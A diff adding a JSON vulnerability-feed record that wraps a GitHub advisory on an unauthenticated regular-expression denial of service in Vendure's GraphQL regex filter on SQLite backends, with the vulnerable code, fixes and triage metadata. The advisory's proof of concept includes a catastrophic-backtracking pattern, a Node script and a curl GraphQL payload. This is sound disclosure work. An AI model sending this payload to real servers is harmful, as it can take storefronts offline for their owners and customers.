@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/63722109?v=4\", \"events_url\": \"https://api.github.com/users/de3erve/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/de3erve/followers\", \"following_url\": \"https://api.github.com/users/de3erve/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/de3erve/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/de3erve\", \"id\": 63722109, \"login\": \"de3erve\", \"node_id\": \"MDQ6VXNlcjYzNzIyMTA5\", \"organizations_url\": \"https://api.github.com/users/de3erve/orgs\", \"received_events_url\": \"https://api.github.com/users/de3erve/received_events\", \"repos_url\": \"https://api.github.com/users/de3erve/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/de3erve/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/de3erve/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/de3erve\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-63460\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-1333\", \"name\": \"Inefficient Regular Expression Complexity\"}], \"description\": \"### Summary\\n\\n> [!IMPORTANT] \\n> Only instances running on the SQLite driver (better-sqlite3) are affected; SQLite is usually used in development/testing backend, so production deployments on PostgreSQL or MySQL/MariaDB are unaffected.\\n\\nThe `StringOperators.regex` filter exposed on the public Shop GraphQL API is evaluated inside the Node.js event loop via a synchronous SQLite user-defined function (UDF). Supplying a catastrophically backtracking pattern blocks the entire event loop, causing a complete denial of service with no authentication required.\\n\\n---\\n\\n### Details\\n\\nVendure registers a JavaScript UDF so that SQLite can handle the `REGEXP` operator:\\n\\n**`packages/core/src/service/helpers/list-query-builder/list-query-builder.ts` lines 917–931**\\n```ts\\nprivate registerSQLiteRegexpFunction() {\\n    const regexpFn = (pattern: string, value: string) => {\\n        const result = new RegExp(`${pattern}`, 'i').test(value);  // user-controlled pattern\\n        return result ? 1 : 0;\\n    };\\n    if (dbType === 'better-sqlite3') {\\n        driver.databaseConnection.function('regexp', regexpFn);\\n    }\\n    if (dbType === 'sqljs') {\\n        driver.databaseConnection.create_function('regexp', regexpFn);\\n    }\\n}\\n```\\n\\nThe `pattern` argument is the raw value of `StringOperators.regex` submitted by the caller. No length limit, timeout, or safe-regex validation is applied before constructing `new RegExp(pattern)`.\\n\\n**`packages/core/src/service/helpers/list-query-builder/parse-filter-params.ts` lines 321–325**\\n```ts\\ncase 'regex':\\n    return {\\n        clause: getRegexpClause(fieldName, argIndex, dbType),\\n        parameters: { [`arg${argIndex}`]: operand },  // operand = raw user input\\n    };\\n```\\n\\nThe `products` resolver in `packages/core/src/api/resolvers/shop/shop-products.resolver.ts` carries **no `@Allow` decorator**, and the access control strategy treats an empty permission set as publicly accessible:\\n\\n**`packages/core/src/config/auth/default-entity-access-control-strategy.ts` lines 49–52**\\n```ts\\nasync canAccess(ctx: RequestContext, permissions: Permission[]): Promise<boolean> {\\n    if (permissions.length === 0) {\\n        return true;   // no @Allow → public\\n    }\\n    ...\\n}\\n```\\n\\nThe three conditions together — user-controlled regex, synchronous JS UDF on the event loop, unauthenticated access — create a complete unauthenticated DoS path.\\n\\nAffected database drivers: `better-sqlite3`, `sqljs`.  \\nMySQL/MariaDB and PostgreSQL delegate the pattern to the database engine (those engines have their own exposure characteristics but do not block the Node.js event loop).\\n\\n---\\n\\n### PoC\\n\\n<img width=\\\"1610\\\" height=\\\"458\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/327f3847-79d9-43e2-859e-47a753e61b2b\\\" />\\n[poc.zip](https://github.com/user-attachments/files/28752976/poc.zip)\\n[poc-redos.js](https://github.com/user-attachments/files/28753000/poc-redos.js)\\n\\n**Prerequisites:** Node.js ≥ 18. No account, no server, no dependencies.\\n\\n**Step 1 — save the following as `poc-redos.js`:**\\n\\n```js\\n// Exact code from list-query-builder.ts:918-919\\nconst PATTERN = '(a+)+$';\\nconst VALUE   = 'a'.repeat(28) + 'b';\\nconsole.log('[*] pattern:', PATTERN, '  value:', VALUE);\\nconsole.log('[*] Starting (server would be unresponsive from this point)...');\\nconst start = Date.now();\\nconst result = new RegExp(`${PATTERN}`, 'i').test(VALUE);\\nconsole.log('[+] elapsed:', Date.now() - start, 'ms  result:', result);\\n```\\n\\n**Step 2 — run it:**\\n```cmd\\nnode poc-redos.js\\n```\\n\\n**Expected output (verified on Node.js v24.14.0):**\\n```\\n[*] pattern: (a+)+$   value: aaaaaaaaaaaaaaaaaaaaaaaaaaaab\\n[*] Starting (server would be unresponsive from this point)...\\n[+] elapsed: 19755 ms  result: false\\n```\\n\\nA 29-character input causes ~20 seconds of CPU spin. Inside a live Vendure server this same code runs synchronously in the SQLite UDF on the Node.js event loop — the process cannot handle any other request for the entire duration.\\n\\n**Step 3 — GraphQL payload (against a running Vendure instance with `better-sqlite3` or `sqljs` driver):**\\n```cmd\\ncurl -s -X POST http://localhost:3000/shop-api -H \\\"Content-Type: application/json\\\" -d \\\"{\\\\\\\"query\\\\\\\":\\\\\\\"{ products(options:{filter:{name:{regex:\\\\\\\\\\\\\\\"(a+)+$\\\\\\\\\\\\\\\"}}}) { items { id } } }\\\\\\\"}\\\" --max-time 60\\n```\\n\\n*No test account is needed. The `products` query is publicly accessible.*\\n\\n---\\n\\n### Impact\\n\\n**Vulnerability type:** Regular Expression Denial of Service (ReDoS)\\n\\n**Who is impacted:**\\n- Any Vendure deployment running with a `better-sqlite3` or `sqljs` database driver (typical for development environments and single-server small deployments created via `@vendure/create`).\\n- Any unauthenticated internet user can trigger the attack — no credentials, no API key, no session.\\n- A single malicious HTTP request blocks the Node.js event loop, making the entire storefront and admin panel unresponsive until the regex engine times out (which may take tens of seconds to minutes depending on the host CPU and pattern chosen).\\n- Repeated requests constitute a sustained DoS requiring no more bandwidth than a single HTTP request per CPU-second.\\n\\n---\\n\\n### Fix\\n\\n1. **Validate the regex before constructing it.** Reject patterns that are known to cause catastrophic backtracking using a safe-regex library (e.g. `safe-regex2` or `recheck`) before passing them to `new RegExp()`.\\n\\n2. **Enforce a maximum pattern length.** Reject `StringOperators.regex` values exceeding a reasonable limit (e.g. 100 characters) at the GraphQL validation layer.\\n\\n3. **Run the UDF in a worker thread.** Move `regexpFn` off the main event loop by executing it in a `worker_threads` context with an `AbortSignal` timeout so a hung regex cannot block the server.\\n\\n4. **Require authentication for filtered list queries.** Add `@Allow(Permission.Authenticated)` to `ShopProductsResolver.products` (and other filterable list queries) if anonymous product browsing is not a business requirement, as a defence-in-depth measure.\\n\\n---\", \"ghsa_id\": \"GHSA-jgm3-qmp2-c4p7\", \"github_reviewed_at\": \"2026-09-17T14:49:56Z\", \"html_url\": \"https://github.com/advisories/GHSA-jgm3-qmp2-c4p7\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-jgm3-qmp2-c4p7\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-63460\"}], \"nvd_published_at\": null, \"published_at\": \"2026-09-17T14:49:56Z\", \"references\": [\"https://github.com/vendurehq/vendure/security/advisories/GHSA-jgm3-qmp2-c4p7\", \"https://github.com/vendurehq/vendure/commit/f74cbbb0b9a50b5b0131822835fe7ee9b71b42c9\", \"https://github.com/vendurehq/vendure/releases/tag/v3.6.5\", \"https://github.com/advisories/GHSA-jgm3-qmp2-c4p7\"], \"repository_advisory_url\": \"https://api.github.com/repos/vendurehq/vendure/security-advisories/GHSA-jgm3-qmp2-c4p7\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/vendurehq/vendure\", \"summary\": \"Vendure: Unauthenticated ReDoS via `regex` filter on SQLite backends\", \"type\": \"reviewed\", \"updated_at\": \"2026-09-17T14:49:57Z\", \"url\": \"https://api.github.com/advisories/GHSA-jgm3-qmp2-c4p7\", \"vulnerabilities\": [{\"first_patched_version\": \"3.6.5\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"vendure/core\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 3.6.4\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-jgm3-qmp2-c4p7",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "vendure/core: <= 3.6.4"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-63460"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "vendure/core"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-09-17T19:13:26.121980Z",
+  "provenance": {
+    "content_sha256": "16fbda13919a3cfaac7127a1babe303475671f42bfc618b0dbd74e074208f47f",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-09-17T14:49:56Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-jgm3-qmp2-c4p7",
+  "status": "active",
+  "title": "Vendure: Unauthenticated ReDoS via `regex` filter on SQLite backends",
+  "updated_at": "2026-09-17T14:49:57Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-jgm3-qmp2-c4p7"
+}
